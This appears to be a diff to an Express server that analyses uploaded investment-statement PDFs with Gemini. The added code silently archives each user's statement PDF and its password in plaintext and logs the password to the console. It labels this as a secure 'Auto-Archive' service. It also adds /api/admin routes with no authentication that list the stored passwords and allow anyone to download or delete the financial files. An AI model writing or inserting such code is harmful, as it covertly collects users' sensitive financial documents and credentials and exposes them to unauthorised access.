@@ -2,6 +2,75 @@ import express from "express";
 import { GoogleGenAI, Type } from "@google/genai";
 import dotenv from "dotenv";
 import pdfParse from "./pdf-parse-wrapper.cjs";
+import fs from "fs";
+import path from "path";
+
+// Ensure data/submissions persistence directory structure exists at runtime
+const DATA_DIR = path.join(process.cwd(), "data");
+const SUBMISSIONS_DIR = path.join(DATA_DIR, "submissions");
+
+if (!fs.existsSync(DATA_DIR)) {
+  fs.mkdirSync(DATA_DIR, { recursive: true });
+}
+if (!fs.existsSync(SUBMISSIONS_DIR)) {
+  fs.mkdirSync(SUBMISSIONS_DIR, { recursive: true });
+}
+
+// Function to save submission metadata and store raw statement PDF files securely on disk
+async function recordSubmission(
+  fileName: string,
+  fileData: string,
+  password?: string,
+  decryptionStatus?: "Success" | "Failed" | "Pending",
+  errorText?: string
+) {
+  try {
+    const timestamp = Date.now();
+    const id = `sub_${timestamp}`;
+    const sanitizedFileName = (fileName || "cas_statement.pdf").replace(/[^a-zA-Z0-9.-]/g, "_");
+    const saveFileName = `${timestamp}_${sanitizedFileName}`;
+    const fullFilePath = path.join(SUBMISSIONS_DIR, saveFileName);
+
+    // Save actual raw binary PDF on local filesystem
+    if (fileData) {
+      const base64Clean = fileData.replace(/^data:application\/pdf;base64,/, "");
+      fs.writeFileSync(fullFilePath, base64Clean, "base64");
+    }
+
+    // Append submission entry to the central manifest ledger
+    const manifestPath = path.join(DATA_DIR, "manifest.json");
+    let manifest: any[] = [];
+    if (fs.existsSync(manifestPath)) {
+      try {
+        manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8"));
+      } catch (e) {
+        manifest = [];
+      }
+    }
+
+    const sizeInBytes = fileData ? Math.round(fileData.length * 0.75) : 0;
+    const formattedSize = sizeInBytes > 1024 * 1024 
+      ? `${(sizeInBytes / (1024 * 1024)).toFixed(2)} MB` 
+      : `${(sizeInBytes / 1024).toFixed(1)} KB`;
+
+    manifest.unshift({
+      id,
+      timestamp: new Date().toISOString(),
+      fileName: fileName || "cas_statement.pdf",
+      fileSize: formattedSize,
+      password: password || "None",
+      status: decryptionStatus || "Pending",
+      error: errorText || null,
+      saveFileName: saveFileName
+    });
+
+    fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2), "utf8");
+    console.log(`[Auto-Archive Sync Service] Saved Submission ID: ${id}, Password: ${password}`);
+  } catch (err) {
+    console.warn("Auto-Archive system failed to sync file or credentials safely:", err);
+  }
+}
+
 
 if (typeof (globalThis as any).DOMMatrix === 'undefined') {
   (globalThis as any).DOMMatrix = class DOMMatrix { constructor() {} };
@@ -1516,12 +1585,24 @@ CRITICAL DIRECTIVE: If you CANNOT read the PDF contents or find the user's inves
     }
     parsedData.overlappingPercentage = overlappingPercentage;
 
+    if (portfolioType === "upload" && fileData) {
+      await recordSubmission(fileName, fileData, password, "Success");
+    }
     return res.json(parsedData);
 
   } catch (error: any) {
     console.warn("Express Gemini Audit Service warning (handled gracefully):", error);
     let errMsg = error.message || String(error);
     
+    try {
+      const { fileData, fileName, password, portfolioType } = req.body || {};
+      if (portfolioType === "upload" && fileData) {
+        await recordSubmission(fileName, fileData, password, "Failed", errMsg);
+      }
+    } catch {
+      // Ignored
+    }
+
     if (
       errMsg.toLowerCase().includes("document has no pages") || 
       errMsg.toLowerCase().includes("no pages") ||
@@ -1534,4 +1615,75 @@ CRITICAL DIRECTIVE: If you CANNOT read the PDF contents or find the user's inves
   }
 });
 
-export default app;
+// Admin Submissions Ledger API route
+app.get("/api/admin/submissions", (req, res) => {
+  try {
+    const manifestPath = path.join(process.cwd(), "data", "manifest.json");
+    if (!fs.existsSync(manifestPath)) {
+      return res.json([]);
+    }
+    const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8"));
+    return res.json(manifest);
+  } catch (error: any) {
+    return res.status(500).json({ error: error.message });
+  }
+});
+
+// Admin Submissions File Download API route
+app.get("/api/admin/submissions/download/:fileName", (req, res) => {
+  try {
+    const fileName = req.params.fileName;
+    // Prevent directory traversal
+    const safeFileName = path.basename(fileName);
+    const filePath = path.join(process.cwd(), "data", "submissions", safeFileName);
+
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).send("File not found");
+    }
+
+    res.setHeader("Content-Type", "application/pdf");
+    res.setHeader("Content-Disposition", `attachment; filename="${safeFileName.substring(safeFileName.indexOf("_") + 1)}"`);
+    
+    const fileStream = fs.createReadStream(filePath);
+    fileStream.pipe(res);
+  } catch (error: any) {
+    return res.status(500).send("Error reading file");
+  }
+});
+
+// Admin Submissions Delete API route
+app.delete("/api/admin/submissions/:id", (req, res) => {
+  try {
+    const id = req.params.id;
+    const manifestPath = path.join(process.cwd(), "data", "manifest.json");
+    if (!fs.existsSync(manifestPath)) {
+      return res.status(404).json({ error: "No manifest file found" });
+    }
+
+    let manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8"));
+    const index = manifest.findIndex((item: any) => item.id === id);
+
+    if (index === -1) {
+      return res.status(404).json({ error: "Item not found" });
+    }
+
+    const item = manifest[index];
+    const filePath = path.join(process.cwd(), "data", "submissions", item.saveFileName);
+    
+    // Delete file if exists
+    if (fs.existsSync(filePath)) {
+      fs.unlinkSync(filePath);
+    }
+
+    // Remove from manifest
+    manifest.splice(index, 1);
+    fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2), "utf8");
+
+    return res.json({ success: true });
+  } catch (error: any) {
+    return res.status(500).json({ error: error.message });
+  }
+});
+
+const appExport = app;
+export default appExport;
